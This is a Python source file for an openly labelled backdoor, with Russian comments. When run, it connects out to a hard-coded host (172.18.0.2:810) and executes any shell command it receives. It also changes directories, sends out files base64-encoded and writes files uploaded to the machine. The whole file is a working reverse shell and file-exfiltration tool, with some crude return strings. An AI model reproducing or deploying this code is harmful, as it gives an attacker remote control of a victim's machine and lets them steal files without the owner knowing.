import socket 
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        # 1 - семейство 2 - тип соедение
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # ip и порт
        self.connection.connect((ip, port))
    
        # форматируем в  json
    def res_send(self, data):
        js = json.dumps(data)
        self.connection.send(js.encode())
        

    # распаковка все это надо чтобы получать объекты полностью
    def req_answer(self):
        # для добавление к переменной
        js = ""
        # цикл 
        while True:
            # если получили все данные для  чтения
            try:
                js = js + self.connection.recv(1024).decode()
                # print(json.loads(js).split())
                return json.loads(js)
            # если не все данные
            except ValueError:
                continue
    
    # созд фун для приема команды и вывода в наш терминал
    def sys_com(self, command):
        return subprocess.check_output(command, shell=True)
    
    # для смены dir
    def change_dir(self, path):
        os.chdir(path)
        return "Change to " + path
    
    # фун для чтения файлов возможность скачать файл
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

        # фун для получения и открытия файла(он будет бинарный)
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "DICK)))"
    
    def run(self):
        # выводим в цикл для бесконечности
        while True:
            # получаем все данные на целевой машине
            com = self.req_answer()  # размер буфера всегда
            # print(com)
            try:
                # закрытие
                if com == "exit":
                    self.connection.close()
                    exit()
                elif com[0] == "cd" and len(com) > 1:
                    command_result = self.change_dir(com[1])
                    # print(command_result)
                elif com[0] == "download":
                    command_result = self.read_file(com[1])
                elif com[0] == "upload":
                    command_result = self.write_file(com[1], com[2])
                else:
                    command_result = self.sys_com(com).decode()
            except Exception:
                command_result = "Man, you fucker"
            self.res_send(command_result)
        
my_back = Backdoor("172.18.0.2", 810)
my_back.run()